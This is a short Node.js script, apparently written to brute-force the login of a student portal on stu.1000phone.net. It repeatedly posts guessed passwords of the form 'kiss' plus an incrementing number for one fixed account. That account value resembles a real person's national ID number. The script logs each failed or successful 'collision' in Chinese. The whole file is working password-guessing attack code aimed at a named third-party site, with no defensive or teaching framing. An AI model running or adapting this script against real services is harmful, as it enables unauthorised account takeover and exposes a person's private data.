const request = require('request')
let password = 0
function hack() {
    request.post({
        url: 'http://stu.1000phone.net/student.php/public/login', formData: {
            Account: '440582199803185438',
            PassWord: `kiss${password++}`
        }
    }, function optionalCallback(err, httpResponse, body) {
        if (body) {
            console.log('碰撞失败，密码为：', `kiss${password}`)
            hack()
        } else {
            console.log('碰撞成功，密码为：', `kiss${password}`)
            return
        }
    });
}
hack()

// 1000phone
